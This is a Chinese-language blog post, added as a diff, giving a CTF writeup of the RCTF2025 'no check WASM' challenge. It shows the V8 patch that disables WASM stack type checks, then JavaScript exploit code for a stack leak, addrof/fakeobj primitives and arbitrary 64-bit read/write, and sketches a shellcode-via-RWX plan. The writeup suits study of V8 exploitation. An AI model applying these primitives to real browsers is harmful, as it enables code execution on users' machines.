@@ -1,0 +1,249 @@
+export const layout = "#components/Page.js";
+export const title = "RCTF2025 Pwn 部分题 Writeup";
+export const description = "";
+export const created = "2025-11-19T22:03:54+08:00";
+
+# RCTR2025 Pwn 部分题解
+
+
+这周末被半期硬控了，众所周知 ctfer 平常都是不听课的，所以我用了两天半速成了大物，这场比赛也没什么输出，赛后复现一下题目。
+
+## no check WASM
+
+先看 diff 文件：
+
+```diff
+...
+diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h
+index b65ba5b9675..163fc536138 100644
+--- a/src/wasm/function-body-decoder-impl.h
++++ b/src/wasm/function-body-decoder-impl.h
+@@ -7878,27 +7878,27 @@ class WasmFullDecoder : public WasmDecoder<ValidationTag, decoding_mode> {
+     // if the current code is reachable even if it is spec-only reachable.
+     if (V8_LIKELY(decoding_mode == kConstantExpression ||
+                   !control_.back().unreachable())) {
+-      if (V8_UNLIKELY(strict_count ? actual != arity : actual < arity)) {
+-        this->DecodeError("expected %u elements on the stack for %s, found %u",
+-                          arity, merge_description, actual);
+-        return false;
+-      }
+-      // Typecheck the topmost {merge->arity} values on the stack.
+-      Value* stack_values = stack_.end() - arity;
+-      for (uint32_t i = 0; i < arity; ++i) {
+-        Value& val = stack_values[i];
+-        Value& old = (*merge)[i];
+-        if (!IsSubtypeOf(val.type, old.type, this->module_)) {
+-          this->DecodeError("type error in %s[%u] (expected %s, got %s)",
+-                            merge_description, i, old.type.name().c_str(),
+-                            val.type.name().c_str());
+-          return false;
+-        }
+-        if constexpr (static_cast<bool>(rewrite_types)) {
+-          // Upcast type on the stack to the target type of the label.
+-          val.type = old.type;
+-        }
+-      }
++      // if (V8_UNLIKELY(strict_count ? actual != arity : actual < arity)) {
++      //   this->DecodeError("expected %u elements on the stack for %s, found %u",
++      //                     arity, merge_description, actual);
++      //   return false;
++      // }
++      // // Typecheck the topmost {merge->arity} values on the stack.
++      // Value* stack_values = stack_.end() - arity;
++      // for (uint32_t i = 0; i < arity; ++i) {
++      //   Value& val = stack_values[i];
++      //   Value& old = (*merge)[i];
++      //   if (!IsSubtypeOf(val.type, old.type, this->module_)) {
++      //     this->DecodeError("type error in %s[%u] (expected %s, got %s)",
++      //                       merge_description, i, old.type.name().c_str(),
++      //                       val.type.name().c_str());
++      //     return false;
++      //   }
++      //   if constexpr (static_cast<bool>(rewrite_types)) {
++      //     // Upcast type on the stack to the target type of the label.
++      //     val.type = old.type;
++      //   }
++      // }
+       return true;
+     }
+     // Unreachable code validation starts here.
+```
+
+
+题如其名，出题人把 wasm 最关键的类型合流函数的栈类型检查删的差不多了，永远返回 true。
+
+想要进入这个 slow path 的话需要让栈值数量与函数签名不匹配，或者是一些复杂的函数。
+
+也就是说，我们可以在 js 里用 wasm 任意构造类型混淆和 oob。
+
+先简单说一下，exp 里用到的很多 helper 函数都是写在 v8 源码里的（[`./test/mjsunit/wasm/wasm-module-builder.js`](./wasm-module-builder.js)），所以 poc 可以直接接着这个写。
+
+比如说最简单的越界读栈上元素：
+
+```js
+function RandomLeak() {
+	const sig = makeSig([], [kWasmI64, kWasmI64, kWasmF64, kWasmF64]);
+	const builder = new WasmModuleBuilder();
+
+	builder
+		.addFunction('bad', sig)
+		.addBody([
+			// kExprEnd,
+		])
+		.exportFunc();
+
+	const module_bytes = builder.toBuffer();
+	const mod = new WebAssembly.Module(module_bytes);
+	const instance = new WebAssembly.Instance(mod, {});
+	var ret_val = instance.exports.bad();
+	return ret_val;
+}
+```
+
+
+就像这样，`makeSig` 函数定义了一个函数的参数和返回值，这里定义有四个返回值；`builder` 的 `addBody` 方法可以添加函数体，这里什么都不写相当于直接返回。这样可以直接读出栈上的值，也就是比较轻松的泄漏栈地址。
+
+用这个思路，我们可以比较轻松的构造 `addrof` 和 `fakeobj` 原语，如下：
+
+```js
+function addrOf(obj) {
+  const sig_r_l = makeSig([kWasmExternRef], [kWasmI64]);  // (externref)->i64
+  const builder = new WasmModuleBuilder();
+  builder.addFunction('addr', sig_r_l)
+    .addBodyWithEnd([
+      kExprLocalGet, 0,
+      kExprEnd,
+    ])
+    .exportFunc();
+  const module_bytes = builder.toBuffer();
+  const mod = new WebAssembly.Module(module_bytes);
+  const instance = new WebAssembly.Instance(mod, {});
+  return instance.exports.addr(obj);
+}
+
+function fakeObj(addr) {
+  const sig_l_r = makeSig([kWasmI64], [kWasmExternRef]);  // (i64)->externref
+  const builder = new WasmModuleBuilder();
+  builder.addFunction('fake', sig_l_r)
+    .addBodyWithEnd([
+      kExprLocalGet, 0,
+      kExprEnd,
+    ])
+    .exportFunc();
+  const module_bytes = builder.toBuffer();
+  const mod = new WebAssembly.Module(module_bytes);
+  const instance = new WebAssembly.Instance(mod, {});
+  return instance.exports.fake(addr);
+}
+```
+
+这里的 `externref` 其实就是一个 js 里的对象。
+
+然后尝试构造任意 64 位地址空间的读写原语。@nighttu 师傅的方法是用 `struct` 和 `I64` 混淆（wasm 里的 `struct` 类型其实就是允许把多个基本类型连起来，和 C/C++ 比较类似）。
+
+构造一个这样的 `struct`：
+
+```js
+const structType = builder.addStruct(
+  [makeField(kWasmI64, true)],  // 只有一个 I64 字段
+  kNoSuperType,                 // 无父类
+  true,                         // final：不能再被其他类型继承
+  false,                        // 非 shared：普通单线程用的 GC 对象
+);
+```
+
+然后使用 `structSet` 和 `structGet` 实现任意读写原语：
+
+```js
+const refStructType = wasmRefType(structType);  // ref struct(i64)
+
+// from_i64: (i64) -> ref struct(i64)
+const sig_cast = makeSig([kWasmI64], [refStructType]);
+const cast = builder.addFunction('from_i64', sig_cast)
+  .addBodyWithEnd([
+    kExprLocalGet, 0,
+    kExprEnd,
+  ]);
+
+const sig_set = makeSig([kWasmI64, kWasmI64], []);
+builder.addFunction('set_field', sig_set)
+  .addBodyWithEnd([
+    kExprLocalGet, 0,
+    kExprCallFunction, ...wasmUnsignedLeb(cast.index, kMaxVarInt32Size),
+    kExprLocalGet, 1,
+    kGCPrefix, kExprStructSet,
+    ...wasmUnsignedLeb(structType, kMaxVarInt32Size),
+    ...wasmUnsignedLeb(0, kMaxVarInt32Size),
+    kExprEnd,
+  ])
+  .exportFunc();
+
+const sig_get = makeSig([kWasmI64], [kWasmI64]);
+builder.addFunction('get_field', sig_get)
+  .addBodyWithEnd([
+    kExprLocalGet, 0,
+    kExprCallFunction, ...wasmUnsignedLeb(cast.index, kMaxVarInt32Size),
+    kGCPrefix, kExprStructGet,
+    ...wasmUnsignedLeb(structType, kMaxVarInt32Size),
+    ...wasmUnsignedLeb(0, kMaxVarInt32Size),
+    kExprEnd,
+  ])
+  .exportFunc();
+
+const module_bytes = builder.toBuffer();
+const mod = new WebAssembly.Module(module_bytes);
+const instance = new WebAssembly.Instance(mod, {});
+
+function read64(addr) {
+  // 这里 -8n 的原因可以调试发现
+  return instance.exports.get_field(addr - 8n + 1n); 
+}
+function write64(addr, value) {
+  instance.exports.set_field(addr + 1n, value);
+}
+```
+
+
+由于已知栈地址，可以比较容易的在 wasm 栈地址上找到含有 rwx 段的地址，然后通过任意地址读写在 rwx 段写大量的 `nop` 最终滑到提权的 shellcode。
+
+调试时可以启用 `--print-wasm-code` 参数，例如查看以下信息：
+
+```
+--- WebAssembly code ---
+name: get_field
+index: 2
+kind: wasm function
+compiler: Liftoff
+Body (size = 128 = 116 + 12 padding)
+Instructions (size = 100, 0x39b37ae659c0-0x39b37ae65a24)
+--- End code ---
+```
+
+然后用 gdb 查看这段 wasm 函数的汇编：
+
+
+```
+0x39b37ae659cb:      sub    rsp,0x18
+0x39b37ae659d2:      cmp    rsp,QWORD PTR [r13-0x60]
+0x39b37ae659d6:      jbe    0x39b37ae65a0c
+0x39b37ae659dc:      mov    rcx,QWORD PTR [rbp-0x18]
+0x39b37ae659e0:      add    DWORD PTR [rcx+0xb],0x2
+0x39b37ae659e4:      mov    QWORD PTR [rbp-0x28],rax
+0x39b37ae659e8:      call   0x39b37ae65000              
+0x39b37ae659ed:      mov    rcx,QWORD PTR [rax+0x7]     // 一般来讲断在第一个 call 之后
+0x39b37ae659f1:      mov    r10,QWORD PTR [rbp-0x10]
+0x39b37ae659f5:      mov    r10,QWORD PTR [r10+0x3f]
+0x39b37ae659f9:      sub    DWORD PTR [r10+0x8],0x6d
+0x39b37ae659fe:      js     0x39b37ae65a19
+0x39b37ae65a04:      mov    rax,rcx
+0x39b37ae65a07:      mov    rsp,rbp
+0x39b37ae65a0a:      pop    rbp
+0x39b37ae65a0b:      ret
+```
+
+
+在这个地方断点去查看当前 wasm 的栈风水是比较准确的。
+
+完整 [exp](./exp.js)
+
+另外远程没有开 pkey protection，本地测试时可以用 `--no-memory-protection-keys` 参数关闭保护。
